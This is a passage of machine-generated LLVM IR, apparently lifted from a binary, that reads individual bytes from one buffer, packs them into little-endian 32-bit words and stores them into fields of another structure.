  %v3_139b0 = load i8, i8* %v2_139b0, align 1
  %v4_139b0 = zext i8 %v3_139b0 to i32
  %v1_139b4 = add i32 %v0_139a0, 90
  %v2_139b4 = inttoptr i32 %v1_139b4 to i8*
  %v3_139b4 = load i8, i8* %v2_139b4, align 1
  %v4_139b4 = zext i8 %v3_139b4 to i32
  %v1_139b8 = add i32 %v0_139a0, 91
  %v2_139b8 = inttoptr i32 %v1_139b8 to i8*
  %v3_139b8 = load i8, i8* %v2_139b8, align 1
  %v4_139b8 = zext i8 %v3_139b8 to i32
  %v4_139bc = mul nuw nsw i32 %v4_139a0, 256
  %v5_139bc = or i32 %v4_139a8, %v4_139bc
  %v4_139c0 = mul nuw nsw i32 %v4_139a4, 256
  %v5_139c0 = or i32 %v4_139ac, %v4_139c0
  store i32 %v5_139c0, i32* %r3.global-to-local, align 4
  %v1_139c4 = add i32 %v0_139a0, 95
  %v2_139c4 = inttoptr i32 %v1_139c4 to i8*
  %v3_139c4 = load i8, i8* %v2_139c4, align 1
  %v4_139c4 = zext i8 %v3_139c4 to i32
  %v4_139c8 = mul nuw nsw i32 %v4_139b0, 65536
  %v5_139c8 = or i32 %v4_139c8, %v5_139c0
  store i32 %v5_139c8, i32* %r3.global-to-local, align 4
  %v4_139cc = mul nuw nsw i32 %v4_139b4, 65536
  %v5_139cc = or i32 %v4_139cc, %v5_139bc
  %v4_139d0 = mul nuw i32 %v4_139b8, 16777216
  %v5_139d0 = or i32 %v4_139d0, %v5_139cc
  %v4_139d4 = mul nuw i32 %v4_139c4, 16777216
  %v5_139d4 = or i32 %v4_139d4, %v5_139c8
  store i32 %v5_139d4, i32* %r6.global-to-local, align 4
  %v1_139d8 = load i32, i32* %r7.global-to-local, align 4
  %v2_139d8 = add i32 %v1_139d8, 88
  %v3_139d8 = inttoptr i32 %v2_139d8 to i32*
  store i32 %v5_139d0, i32* %v3_139d8, align 4
  %v0_139dc = load i32, i32* %r6.global-to-local, align 4
  %v1_139dc = load i32, i32* %r7.global-to-local, align 4
  %v2_139dc = add i32 %v1_139dc, 92
  %v3_139dc = inttoptr i32 %v2_139dc to i32*
  store i32 %v0_139dc, i32* %v3_139dc, align 4
  %v0_139e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_139e0 = add i32 %v0_139e0, 13
  %v2_139e0 = inttoptr i32 %v1_139e0 to i8*
  %v3_139e0 = load i8, i8* %v2_139e0, align 1
  %v4_139e0 = zext i8 %v3_139e0 to i32
  %v1_139e4 = add i32 %v0_139e0, 12
  %v2_139e4 = inttoptr i32 %v1_139e4 to i8*
  %v3_139e4 = load i8, i8* %v2_139e4, align 1
  %v4_139e4 = zext i8 %v3_139e4 to i32
  store i32 %v4_139e4, i32* %r3.global-to-local, align 4
  %v1_139e8 = add i32 %v0_139e0, 14
  %v2_139e8 = inttoptr i32 %v1_139e8 to i8*
  %v3_139e8 = load i8, i8* %v2_139e8, align 1
  %v4_139e8 = zext i8 %v3_139e8 to i32
  %v4_139ec = mul nuw nsw i32 %v4_139e0, 256
  %v5_139ec = or i32 %v4_139e4, %v4_139ec
  store i32 %v5_139ec, i32* %r3.global-to-local, align 4
  %v1_139f0 = add i32 %v0_139e0, 15
  %v2_139f0 = inttoptr i32 %v1_139f0 to i8*
  %v3_139f0 = load i8, i8* %v2_139f0, align 1
  %v4_139f0 = zext i8 %v3_139f0 to i32
  %v4_139f4 = mul nuw nsw i32 %v4_139e8, 65536
  %v5_139f4 = or i32 %v4_139f4, %v5_139ec
  %v4_139f8 = mul nuw i32 %v4_139f0, 16777216
  %v5_139f8 = or i32 %v5_139f4, %v4_139f8
  store i32 %v5_139f8, i32* %r3.global-to-local, align 4
  %v1_139fc = load i32, i32* %r7.global-to-local, align 4
  %v2_139fc = add i32 %v1_139fc, 12
  %v3_139fc = inttoptr i32 %v2_139fc to i32*
  store i32 %v5_139f8, i32* %v3_139fc, align 4
  %v0_13a00 = load i32, i32* %r4.global-to-local, align 4
  %v1_13a00 = add i32 %v0_13a00, 17
  %v2_13a00 = inttoptr i32 %v1_13a00 to i8*
  %v3_13a00 = load i8, i8* %v2_13a00, align 1
  %v4_13a00 = zext i8 %v3_13a00 to i32
  %v1_13a04 = add i32 %v0_13a00, 16
  %v2_13a04 = inttoptr i32 %v1_13a04 to i8*
  %v3_13a04 = load i8, i8* %v2_13a04, align 1
  %v4_13a04 = zext i8 %v3_13a04 to i32
  store i32 %v4_13a04, i32* %r3.global-to-local, align 4
  %v1_13a08 = add i32 %v0_13a00, 18
  %v2_13a08 = inttoptr i32 %v1_13a08 to i8*
  %v3_13a08 = load i8, i8* %v2_13a08, align 1
  %v4_13a08 = zext i8 %v3_13a08 to i32
  %v4_13a0c = mul nuw nsw i32 %v4_13a00, 256
  %v5_13a0c = or i32 %v4_13a04, %v4_13a0c
  store i32 %v5_13a0c, i32* %r3.global-to-local, align 4
  %v1_13a10 = add i32 %v0_13a00, 19
  %v2_13a10 = inttoptr i32 %v1_13a10 to i8*
  %v3_13a10 = load i8, i8* %v2_13a10, align 1
  %v4_13a10 = zext i8 %v3_13a10 to i32
  %v4_13a14 = mul nuw nsw i32 %v4_13a08, 65536
  %v5_13a14 = or i32 %v4_13a14, %v5_13a0c
  %v4_13a18 = mul nuw i32 %v4_13a10, 16777216
  %v5_13a18 = or i32 %v5_13a14, %v4_13a18
  store i32 %v5_13a18, i32* %r3.global-to-local, align 4
  %v1_13a1c = load i32, i32* %r7.global-to-local, align 4
  %v2_13a1c = add i32 %v1_13a1c, 16
  %v3_13a1c = inttoptr i32 %v2_13a1c to i32*
  store i32 %v5_13a18, i32* %v3_13a1c, align 4
  %v0_13a20 = load i32, i32* %r4.global-to-local, align 4
  %v1_13a20 = add i32 %v0_13a20, 21
  %v2_13a20 = inttoptr i32 %v1_13a20 to i8*
  %v3_13a20 = load i8, i8* %v2_13a20, align 1
  %v4_13a20 = zext i8 %v3_13a20 to i32
  %v1_13a24 = add i32 %v0_13a20, 20
  %v2_13a24 = inttoptr i32 %v1_13a24 to i8*
  %v3_13a24 = load i8, i8* %v2_13a24, align 1
  %v4_13a24 = zext i8 %v3_13a24 to i32
  store i32 %v4_13a24, i32* %r3.global-to-local, align 4
  %v1_13a28 = add i32 %v0_13a20, 22
  %v2_13a28 = inttoptr i32 %v1_13a28 to i8*
  %v3_13a28 = load i8, i8* %v2_13a28, align 1
  %v4_13a28 = zext i8 %v3_13a28 to i32
  %v4_13a2c = mul nuw nsw i32 %v4_13a20, 256
  %v5_13a2c = or i32 %v4_13a24, %v4_13a2c
  store i32 %v5_13a2c, i32* %r3.global-to-local, align 4
  %v1_13a30 = add i32 %v0_13a20, 23
  %v2_13a30 = inttoptr i32 %v1_13a30 to i8*
  %v3_13a30 = load i8, i8* %v2_13a30, align 1
  %v4_13a30 = zext i8 %v3_13a30 to i32
  %v4_13a34 = mul nuw nsw i32 %v4_13a28, 65536
  %v5_13a34 = or i32 %v4_13a34, %v5_13a2c
  %v4_13a38 = mul nuw i32 %v4_13a30, 16777216
  %v5_13a38 = or i32 %v5_13a34, %v4_13a38
  store i32 %v5_13a38, i32* %r3.global-to-local, align 4
  %v1_13a3c = load i32, i32* %r7.global-to-local, align 4
  %v2_13a3c = add i32 %v1_13a3c, 20
  %v3_13a3c = inttoptr i32 %v2_13a3c to i32*
  store i32 %v5_13a38, i32* %v3_13a3c, align 4
  %v0_13a40 = load i32, i32* %r4.global-to-local, align 4
  %v1_13a40 = add i32 %v0_13a40, 25
  %v2_13a40 = inttoptr i32 %v1_13a40 to i8*
  %v3_13a40 = load i8, i8* %v2_13a40, align 1
  %v4_13a40 = zext i8 %v3_13a40 to i32
  %v1_13a44 = add i32 %v0_13a40, 24
  %v2_13a44 = inttoptr i32 %v1_13a44 to i8*
  %v3_13a44 = load i8, i8* %v2_13a44, align 1
  %v4_13a44 = zext i8 %v3_13a44 to i32
  store i32 %v4_13a44, i32* %r3.global-to-local, align 4
  %v1_13a48 = add i32 %v0_13a40, 26
  %v2_13a48 = inttoptr i32 %v1_13a48 to i8*
  %v3_13a48 = load i8, i8* %v2_13a48, align 1
  %v4_13a48 = zext i8 %v3_13a48 to i32
  %v4_13a4c = mul nuw nsw i32 %v4_13a40, 256
  %v5_13a4c = or i32 %v4_13a44, %v4_13a4c
  store i32 %v5_13a4c, i32* %r3.global-to-local, align 4
  %v1_13a50 = add i32 %v0_13a40, 27
  %v2_13a50 = inttoptr i32 %v1_13a50 to i8*
  %v3_13a50 = load i8, i8* %v2_13a50, align 1
  %v4_13a50 = zext i8 %v3_13a50 to i32
  %v4_13a54 = mul nuw nsw i32 %v4_13a48, 65536
  %v5_13a54 = or i32 %v4_13a54, %v5_13a4c
  %v4_13a58 = mul nuw i32 %v4_13a50, 16777216
  %v5_13a58 = or i32 %v5_13a54, %v4_13a58
  store i32 %v5_13a58, i32* %r3.global-to-local, align 4
  %v1_13a5c = load i32, i32* %r7.global-to-local, align 4
  %v2_13a5c = add i32 %v1_13a5c, 24
  %v3_13a5c = inttoptr i32 %v2_13a5c to i32*
  store i32 %v5_13a58, i32* %v3_13a5c, align 4
  %v0_13a60 = load i32, i32* %r4.global-to-local, align 4
  %v1_13a60 = add i32 %v0_13a60, 29
  %v2_13a60 = inttoptr i32 %v1_13a60 to i8*
  %v3_13a60 = load i8, i8* %v2_13a60, align 1
  %v4_13a60 = zext i8 %v3_13a60 to i32
  %v1_13a64 = add i32 %v0_13a60, 28
  %v2_13a64 = inttoptr i32 %v1_13a64 to i8*
  %v3_13a64 = load i8, i8* %v2_13a64, align 1
  %v4_13a64 = zext i8 %v3_13a64 to i32
  store i32 %v4_13a64, i32* %r3.global-to-local, align 4
  %v1_13a68 = add i32 %v0_13a60, 30
  %v2_13a68 = inttoptr i32 %v1_13a68 to i8*
  %v3_13a68 = load i8, i8* %v2_13a68, align 1
  %v4_13a68 = zext i8 %v3_13a68 to i32
  %v4_13a6c = mul nuw nsw i32 %v4_13a60, 256
  %v5_13a6c = or i32 %v4_13a64, %v4_13a6c
  store i32 %v5_13a6c, i32* %r3.global-to-local, align 4
  %v1_13a70 = add i32 %v0_13a60, 31
  %v2_13a70 = inttoptr i32 %v1_13a70 to i8*
  %v3_13a70 = load i8, i8* %v2_13a70, align 1
  %v4_13a70 = zext i8 %v3_13a70 to i32
  %v4_13a74 = mul nuw nsw i32 %v4_13a68, 65536
  %v5_13a74 = or i32 %v4_13a74, %v5_13a6c
  %v4_13a78 = mul nuw i32 %v4_13a70, 16777216
  %v5_13a78 = or i32 %v5_13a74, %v4_13a78
  store i32 %v5_13a78, i32* %r3.global-to-local, align 4
  %v1_13a7c = load i32, i32* %r7.global-to-local, align 4
  %v2_13a7c = add i32 %v1_13a7c, 28
  %v3_13a7c = inttoptr i32 %v2_13a7c to i32*
  store i32 %v5_13a78, i32* %v3_13a7c, align 4
  %v0_13a80 = load i32, i32* %r4.global-to-local, align 4
  %v1_13a80 = add i32 %v0_13a80, 33
  %v2_13a80 = inttoptr i32 %v1_13a80 to i8*
  %v3_13a80 = load i8, i8* %v2_13a80, align 1
  %v4_13a80 = zext i8 %v3_13a80 to i32
  %v1_13a84 = add i32 %v0_13a80, 37
  %v2_13a84 = inttoptr i32 %v1_13a84 to i8*
  %v3_13a84 = load i8, i8* %v2_13a84, align 1
  %v4_13a84 = zext i8 %v3_13a84 to i32
  %v1_13a88 = add i32 %v0_13a80, 32
  %v2_13a88 = inttoptr i32 %v1_13a88 to i8*
  %v3_13a88 = load i8, i8* %v2_13a88, align 1
  %v4_13a88 = zext i8 %v3_13a88 to i32
  %v1_13a8c = add i32 %v0_13a80, 36
  %v2_13a8c = inttoptr i32 %v1_13a8c to i8*
  %v3_13a8c = load i8, i8* %v2_13a8c, align 1
  %v4_13a8c = zext i8 %v3_13a8c to i32
  store i32 %v4_13a8c, i32* %r3.global-to-local, align 4
  %v1_13a90 = add i32 %v0_13a80, 34
  %v2_13a90 = inttoptr i32 %v1_13a90 to i8*
  %v3_13a90 = load i8, i8* %v2_13a90, align 1
  %v4_13a90 = zext i8 %v3_13a90 to i32
  %v1_13a94 = add i32 %v0_13a80, 38
  %v2_13a94 = inttoptr i32 %v1_13a94 to i8*
  %v3_13a94 = load i8, i8* %v2_13a94, align 1
  %v4_13a94 = zext i8 %v3_13a94 to i32
  %v1_13a98 = add i32 %v0_13a80, 35
  %v2_13a98 = inttoptr i32 %v1_13a98 to i8*
  %v3_13a98 = load i8, i8* %v2_13a98, align 1
  %v4_13a98 = zext i8 %v3_13a98 to i32
  %v4_13a9c = mul nuw nsw i32 %v4_13a80, 256
  %v5_13a9c = or i32 %v4_13a88, %v4_13a9c
  %v4_13aa0 = mul nuw nsw i32 %v4_13a84, 256
  %v5_13aa0 = or i32 %v4_13a8c, %v4_13aa0
  store i32 %v5_13aa0, i32* %r3.global-to-local, align 4
  %v1_13aa4 = add i32 %v0_13a80, 39
  %v2_13aa4 = inttoptr i32 %v1_13aa4 to i8*
  %v3_13aa4 = load i8, i8* %v2_13aa4, align 1
  %v4_13aa4 = zext i8 %v3_13aa4 to i32
  %v4_13aa8 = mul nuw nsw i32 %v4_13a90, 65536
  %v5_13aa8 = or i32 %v4_13aa8, %v5_13a9c
  %v4_13aac = mul nuw nsw i32 %v4_13a94, 65536
  %v5_13aac = or i32 %v4_13aac, %v5_13aa0
  %v4_13ab0 = mul nuw i32 %v4_13a98, 16777216
  %v5_13ab0 = or i32 %v5_13aa8, %v4_13ab0
  %v4_13ab4 = mul nuw i32 %v4_13aa4, 16777216
  %v5_13ab4 = or i32 %v5_13aac, %v4_13ab4
  store i32 %v5_13ab4, i32* %r3.global-to-local, align 4
  %v1_13ac8 = load i32, i32* %r7.global-to-local, align 4
  %v2_13ac8 = add i32 %v1_13ac8, 32
  %v3_13ac8 = inttoptr i32 %v2_13ac8 to i32*
  store i32 %v5_13ab0, i32* %v3_13ac8, align 4
  %v0_13acc = load i32, i32* %r3.global-to-local, align 4
  %v1_13acc = load i32, i32* %r7.global-to-local, align 4
  %v2_13acc = add i32 %v1_13acc, 36
  %v3_13acc = inttoptr i32 %v2_13acc to i32*
  store i32 %v0_13acc, i32* %v3_13acc, align 4
  %v0_13ad0 = load i32, i32* %r4.global-to-local, align 4
  %v1_13ad0 = add i32 %v0_13ad0, 45
  %v2_13ad0 = inttoptr i32 %v1_13ad0 to i8*
  %v3_13ad0 = load i8, i8* %v2_13ad0, align 1
  %v4_13ad0 = zext i8 %v3_13ad0 to i32
  %v1_13ad4 = add i32 %v0_13ad0, 49
  %v2_13ad4 = inttoptr i32 %v1_13ad4 to i8*
  %v3_13ad4 = load i8, i8* %v2_13ad4, align 1
  %v4_13ad4 = zext i8 %v3_13ad4 to i32
  %v1_13ad8 = add i32 %v0_13ad0, 44
  %v2_13ad8 = inttoptr i32 %v1_13ad8 to i8*
  %v3_13ad8 = load i8, i8* %v2_13ad8, align 1
  %v4_13ad8 = zext i8 %v3_13ad8 to i32
  %v1_13adc = add i32 %v0_13ad0, 48
  %v2_13adc = inttoptr i32 %v1_13adc to i8*
  %v3_13adc = load i8, i8* %v2_13adc, align 1
  %v4_13adc = zext i8 %v3_13adc to i32
  store i32 %v4_13adc, i32* %r3.global-to-local, align 4
  %v1_13ae0 = add i32 %v0_13ad0, 46
  %v2_13ae0 = inttoptr i32 %v1_13ae0 to i8*
  %v3_13ae0 = load i8, i8* %v2_13ae0, align 1
  %v4_13ae0 = zext i8 %v3_13ae0 to i32
  %v1_13ae4 = add i32 %v0_13ad0, 50
  %v2_13ae4 = inttoptr i32 %v1_13ae4 to i8*
  %v3_13ae4 = load i8, i8* %v2_13ae4, align 1
  %v4_13ae4 = zext i8 %v3_13ae4 to i32
  %v1_13ae8 = add i32 %v0_13ad0, 47
  %v2_13ae8 = inttoptr i32 %v1_13ae8 to i8*
  %v3_13ae8 = load i8, i8* %v2_13ae8, align 1
  %v4_13ae8 = zext i8 %v3_13ae8 to i32
  %v4_13aec = mul nuw nsw i32 %v4_13ad0, 256
  %v5_13aec = or i32 %v4_13ad8, %v4_13aec
  %v4_13af0 = mul nuw nsw i32 %v4_13ad4, 256
  %v5_13af0 = or i32 %v4_13adc, %v4_13af0
  store i32 %v5_13af0, i32* %r3.global-to-local, align 4
  %v1_13af4 = add i32 %v0_13ad0, 51
  %v2_13af4 = inttoptr i32 %v1_13af4 to i8*
  %v3_13af4 = load i8, i8* %v2_13af4, align 1
  %v4_13af4 = zext i8 %v3_13af4 to i32
  %v4_13af8 = mul nuw nsw i32 %v4_13ae0, 65536
  %v5_13af8 = or i32 %v4_13af8, %v5_13aec
  %v4_13afc = mul nuw nsw i32 %v4_13ae4, 65536
  %v5_13afc = or i32 %v4_13afc, %v5_13af0
  %v4_13b00 = mul nuw i32 %v4_13ae8, 16777216
  %v5_13b00 = or i32 %v5_13af8, %v4_13b00
  %v4_13b04 = mul nuw i32 %v4_13af4, 16777216
  %v5_13b04 = or i32 %v5_13afc, %v4_13b04
  store i32 %v5_13b04, i32* %r3.global-to-local, align 4
  %v1_13b18 = load i32, i32* %r7.global-to-local, align 4
  %v2_13b18 = add i32 %v1_13b18, 44
  %v3_13b18 = inttoptr i32 %v2_13b18 to i32*
  store i32 %v5_13b00, i32* %v3_13b18, align 4
  %v0_13b1c = load i32, i32* %r3.global-to-local, align 4
  %v1_13b1c = load i32, i32* %r7.global-to-local, align 4
  %v2_13b1c = add i32 %v1_13b1c, 48
  %v3_13b1c = inttoptr i32 %v2_13b1c to i32*
  store i32 %v0_13b1c, i32* %v3_13b1c, align 4
  %v0_13b20 = load i32, i32* %r4.global-to-local, align 4
  %v1_13b20 = add i32 %v0_13b20, 53
  %v2_13b20 = inttoptr i32 %v1_13b20 to i8*
  %v3_13b20 = load i8, i8* %v2_13b20, align 1
  %v4_13b20 = zext i8 %v3_13b20 to i32
  %v1_13b24 = add i32 %v0_13b20, 52
  %v2_13b24 = inttoptr i32 %v1_13b24 to i8*
  %v3_13b24 = load i8, i8* %v2_13b24, align 1
  %v4_13b24 = zext i8 %v3_13b24 to i32
  store i32 %v4_13b24, i32* %r3.global-to-local, align 4
  %v1_13b28 = add i32 %v0_13b20, 54
  %v2_13b28 = inttoptr i32 %v1_13b28 to i8*
  %v3_13b28 = load i8, i8* %v2_13b28, align 1
  %v4_13b28 = zext i8 %v3_13b28 to i32
  %v4_13b2c = mul nuw nsw i32 %v4_13b20, 256
  %v5_13b2c = or i32 %v4_13b24, %v4_13b2c
  store i32 %v5_13b2c, i32* %r3.global-to-local, align 4
  %v1_13b30 = add i32 %v0_13b20, 55
  %v2_13b30 = inttoptr i32 %v1_13b30 to i8*
  %v3_13b30 = load i8, i8* %v2_13b30, align 1
  %v4_13b30 = zext i8 %v3_13b30 to i32
  %v4_13b34 = mul nuw nsw i32 %v4_13b28, 65536
  %v5_13b34 = or i32 %v4_13b34, %v5_13b2c
  %v4_13b38 = mul nuw i32 %v4_13b30, 16777216
  %v5_13b38 = or i32 %v5_13b34, %v4_13b38
  store i32 %v5_13b38, i32* %r3.global-to-local, align 4
  %v1_13b3c = load i32, i32* %r7.global-to-local, align 4
  %v2_13b3c = add i32 %v1_13b3c, 52
  %v3_13b3c = inttoptr i32 %v2_13b3c to i32*
  store i32 %v5_13b38, i32* %v3_13b3c, align 4
  %v0_13b40 = load i32, i32* %r4.global-to-local, align 4
  %v1_13b40 = add i32 %v0_13b40, 57
  %v2_13b40 = inttoptr i32 %v1_13b40 to i8*
  %v3_13b40 = load i8, i8* %v2_13b40, align 1
  %v4_13b40 = zext i8 %v3_13b40 to i32
  %v1_13b44 = add i32 %v0_13b40, 56
  %v2_13b44 = inttoptr i32 %v1_13b44 to i8*
  %v3_13b44 = load i8, i8* %v2_13b44, align 1
  %v4_13b44 = zext i8 %v3_13b44 to i32
  %v1_13b48 = add i32 %v0_13b40, 60
  %v2_13b48 = inttoptr i32 %v1_13b48 to i8*
  %v3_13b48 = load i8, i8* %v2_13b48, align 1
  %v4_13b48 = zext i8 %v3_13b48 to i32
  store i32 %v4_13b48, i32* %r3.global-to-local, align 4
  %v1_13b4c = add i32 %v0_13b40, 61
  %v2_13b4c = inttoptr i32 %v1_13b4c to i8*
  %v3_13b4c = load i8, i8* %v2_13b4c, align 1
  %v4_13b4c = zext i8 %v3_13b4c to i32
  %v1_13b50 = add i32 %v0_13b40, 58
  %v2_13b50 = inttoptr i32 %v1_13b50 to i8*
  %v3_13b50 = load i8, i8* %v2_13b50, align 1
  %v4_13b50 = zext i8 %v3_13b50 to i32
  %v1_13b54 = add i32 %v0_13b40, 62
  %v2_13b54 = inttoptr i32 %v1_13b54 to i8*
  %v3_13b54 = load i8, i8* %v2_13b54, align 1
  %v4_13b54 = zext i8 %v3_13b54 to i32
  %v1_13b58 = add i32 %v0_13b40, 59
  %v2_13b58 = inttoptr i32 %v1_13b58 to i8*
  %v3_13b58 = load i8, i8* %v2_13b58, align 1
  %v4_13b58 = zext i8 %v3_13b58 to i32
  %v4_13b5c = mul nuw nsw i32 %v4_13b40, 256
  %v5_13b5c = or i32 %v4_13b44, %v4_13b5c
  %v4_13b60 = mul nuw nsw i32 %v4_13b4c, 256
  %v5_13b60 = or i32 %v4_13b60, %v4_13b48
  store i32 %v5_13b60, i32* %r3.global-to-local, align 4
  %v1_13b64 = add i32 %v0_13b40, 63
  %v2_13b64 = inttoptr i32 %v1_13b64 to i8*
  %v3_13b64 = load i8, i8* %v2_13b64, align 1
  %v4_13b64 = zext i8 %v3_13b64 to i32
  %v4_13b68 = mul nuw nsw i32 %v4_13b50, 65536
  %v5_13b68 = or i32 %v4_13b68, %v5_13b5c
  %v4_13b6c = mul nuw nsw i32 %v4_13b54, 65536
  %v5_13b6c = or i32 %v4_13b6c, %v5_13b60
  %v4_13b70 = mul nuw i32 %v4_13b64, 16777216
  %v5_13b70 = or i32 %v5_13b6c, %v4_13b70
  %v4_13b74 = mul nuw i32 %v4_13b58, 16777216
  %v5_13b74 = or i32 %v5_13b68, %v4_13b74
  store i32 %v5_13b70, i32* %r3.global-to-local, align 4
  %v1_13b84 = load i32, i32* %r7.global-to-local, align 4
  %v2_13b84 = add i32 %v1_13b84, 56
  %v3_13b84 = inttoptr i32 %v2_13b84 to i32*
  store i32 %v5_13b74, i32* %v3_13b84, align 4
  %v0_13b88 = load i32, i32* %r3.global-to-local, align 4
  %v1_13b88 = load i32, i32* %r7.global-to-local, align 4
  %v2_13b88 = add i32 %v1_13b88, 60
  %v3_13b88 = inttoptr i32 %v2_13b88 to i32*
  store i32 %v0_13b88, i32* %v3_13b88, align 4
  %v0_13b8c = load i32, i32* %r4.global-to-local, align 4
  %v1_13b8c = add i32 %v0_13b8c, 65
  %v2_13b8c = inttoptr i32 %v1_13b8c to i8*
  %v3_13b8c = load i8, i8* %v2_13b8c, align 1
  %v4_13b8c = zext i8 %v3_13b8c to i32
  %v1_13b90 = add i32 %v0_13b8c, 64
  %v2_13b90 = inttoptr i32 %v1_13b90 to i8*
  %v3_13b90 = load i8, i8* %v2_13b90, align 1
  %v4_13b90 = zext i8 %v3_13b90 to i32
  store i32 %v4_13b90, i32* %r3.global-to-local, align 4
  %v1_13b94 = add i32 %v0_13b8c, 66
  %v2_13b94 = inttoptr i32 %v1_13b94 to i8*
  %v3_13b94 = load i8, i8* %v2_13b94, align 1
  %v4_13b94 = zext i8 %v3_13b94 to i32
  %v4_13b98 = mul nuw nsw i32 %v4_13b8c, 256
  %v5_13b98 = or i32 %v4_13b90, %v4_13b98
  store i32 %v5_13b98, i32* %r3.global-to-local, align 4
  %v1_13b9c = add i32 %v0_13b8c, 67
  %v2_13b9c = inttoptr i32 %v1_13b9c to i8*
  %v3_13b9c = load i8, i8* %v2_13b9c, align 1
  %v4_13b9c = zext i8 %v3_13b9c to i32
  %v4_13ba0 = mul nuw nsw i32 %v4_13b94, 65536
  %v5_13ba0 = or i32 %v4_13ba0, %v5_13b98
  %v4_13ba4 = mul nuw i32 %v4_13b9c, 16777216
  %v5_13ba4 = or i32 %v5_13ba0, %v4_13ba4
  store i32 %v5_13ba4, i32* %r3.global-to-local, align 4
  %v1_13ba8 = load i32, i32* %r7.global-to-local, align 4
  %v2_13ba8 = add i32 %v1_13ba8, 64
  %v3_13ba8 = inttoptr i32 %v2_13ba8 to i32*
  store i32 %v5_13ba4, i32* %v3_13ba8, align 4
  %v0_13bac = load i32, i32* %r4.global-to-local, align 4
  %v1_13bac = add i32 %v0_13bac, 73
  %v2_13bac = inttoptr i32 %v1_13bac to i8*
  %v3_13bac = load i8, i8* %v2_13bac, align 1
  %v4_13bac = zext i8 %v3_13bac to i32
  %v1_13bb0 = add i32 %v0_13bac, 72
  %v2_13bb0 = inttoptr i32 %v1_13bb0 to i8*
  %v3_13bb0 = load i8, i8* %v2_13bb0, align 1
  %v4_13bb0 = zext i8 %v3_13bb0 to i32
  store i32 %v4_13bb0, i32* %r3.global-to-local, align 4
  %v1_13bb4 = add i32 %v0_13bac, 74
  %v2_13bb4 = inttoptr i32 %v1_13bb4 to i8*
  %v3_13bb4 = load i8, i8* %v2_13bb4, align 1
  %v4_13bb4 = zext i8 %v3_13bb4 to i32
  %v4_13bb8 = mul nuw nsw i32 %v4_13bac, 256
  %v5_13bb8 = or i32 %v4_13bb0, %v4_13bb8
  store i32 %v5_13bb8, i32* %r3.global-to-local, align 4
  %v1_13bbc = add i32 %v0_13bac, 75
  %v2_13bbc = inttoptr i32 %v1_13bbc to i8*
  %v3_13bbc = load i8, i8* %v2_13bbc, align 1
  %v4_13bbc = zext i8 %v3_13bbc to i32
  %v4_13bc0 = mul nuw nsw i32 %v4_13bb4, 65536
  %v5_13bc0 = or i32 %v4_13bc0, %v5_13bb8
  %v4_13bc4 = mul nuw i32 %v4_13bbc, 16777216
  %v5_13bc4 = or i32 %v5_13bc0, %v4_13bc4
  store i32 %v5_13bc4, i32* %r3.global-to-local, align 4
  %v1_13bc8 = load i32, i32* %r7.global-to-local, align 4
  %v2_13bc8 = add i32 %v1_13bc8, 72
  %v3_13bc8 = inttoptr i32 %v2_13bc8 to i32*
  store i32 %v5_13bc4, i32* %v3_13bc8, align 4
  %v0_13bcc = load i32, i32* %r4.global-to-local, align 4
  %v1_13bcc = add i32 %v0_13bcc, 81
  %v2_13bcc = inttoptr i32 %v1_13bcc to i8*
  %v3_13bcc = load i8, i8* %v2_13bcc, align 1
  %v4_13bcc = zext i8 %v3_13bcc to i32
  %v1_13bd0 = add i32 %v0_13bcc, 80
  %v2_13bd0 = inttoptr i32 %v1_13bd0 to i8*
  %v3_13bd0 = load i8, i8* %v2_13bd0, align 1
  %v4_13bd0 = zext i8 %v3_13bd0 to i32
  store i32 %v4_13bd0, i32* %r3.global-to-local, align 4
  %v1_13bd4 = add i32 %v0_13bcc, 82
  %v2_13bd4 = inttoptr i32 %v1_13bd4 to i8*
  %v3_13bd4 = load i8, i8* %v2_13bd4, align 1
  %v4_13bd4 = zext i8 %v3_13bd4 to i32
  %v4_13bd8 = mul nuw nsw i32 %v4_13bcc, 256
  %v5_13bd8 = or i32 %v4_13bd0, %v4_13bd8
  store i32 %v5_13bd8, i32* %r3.global-to-local, align 4
  %v1_13bdc = add i32 %v0_13bcc, 83
  %v2_13bdc = inttoptr i32 %v1_13bdc to i8*
  %v3_13bdc = load i8, i8* %v2_13bdc, align 1
  %v4_13bdc = zext i8 %v3_13bdc to i32
  %v4_13be0 = mul nuw nsw i32 %v4_13bd4, 65536
  %v5_13be0 = or i32 %v4_13be0, %v5_13bd8
  %v4_13be4 = mul nuw i32 %v4_13bdc, 16777216
  %v5_13be4 = or i32 %v5_13be0, %v4_13be4
  store i32 %v5_13be4, i32* %r3.global-to-local, align 4
  %v1_13be8 = load i32, i32* %r7.global-to-local, align 4
  %v2_13be8 = add i32 %v1_13be8, 80
  %v3_13be8 = inttoptr i32 %v2_13be8 to i32*
  store i32 %v5_13be4, i32* %v3_13be8, align 4
  %v0_13bec = load i32, i32* %r4.global-to-local, align 4
  %v1_13bec = add i32 %v0_13bec, 69
  %v2_13bec = inttoptr i32 %v1_13bec to i8*
  %v3_13bec = load i8, i8* %v2_13bec, align 1
  %v4_13bec = zext i8 %v3_13bec to i32
  %v1_13bf0 = add i32 %v0_13bec, 68
  %v2_13bf0 = inttoptr i32 %v1_13bf0 to i8*
  %v3_13bf0 = load i8, i8* %v2_13bf0, align 1
  %v4_13bf0 = zext i8 %v3_13bf0 to i32
  store i32 %v4_13bf0, i32* %r3.global-to-local, align 4
  %v1_13bf4 = add i32 %v0_13bec, 70
  %v2_13bf4 = inttoptr i32 %v1_13bf4 to i8*
  %v3_13bf4 = load i8, i8* %v2_13bf4, align 1
  %v4_13bf4 = zext i8 %v3_13bf4 to i32
  %v4_13bf8 = mul nuw nsw i32 %v4_13bec, 256
  %v5_13bf8 = or i32 %v4_13bf0, %v4_13bf8
  store i32 %v5_13bf8, i32* %r3.global-to-local, align 4
  %v1_13bfc = add i32 %v0_13bec, 71
  %v2_13bfc = inttoptr i32 %v1_13bfc to i8*
  %v3_13bfc = load i8, i8* %v2_13bfc, align 1
  %v4_13bfc = zext i8 %v3_13bfc to i32
  %v4_13c00 = mul nuw nsw i32 %v4_13bf4, 65536
  %v5_13c00 = or i32 %v4_13c00, %v5_13bf8
  %v4_13c04 = mul nuw i32 %v4_13bfc, 16777216
  %v5_13c04 = or i32 %v5_13c00, %v4_13c04
  store i32 %v5_13c04, i32* %r3.global-to-local, align 4
  %v1_13c08 = load i32, i32* %r7.global-to-local, align 4
  %v2_13c08 = add i32 %v1_13c08, 68
  %v3_13c08 = inttoptr i32 %v2_13c08 to i32*
  store i32 %v5_13c04, i32* %v3_13c08, align 4
  %v0_13c0c = load i32, i32* %r4.global-to-local, align 4
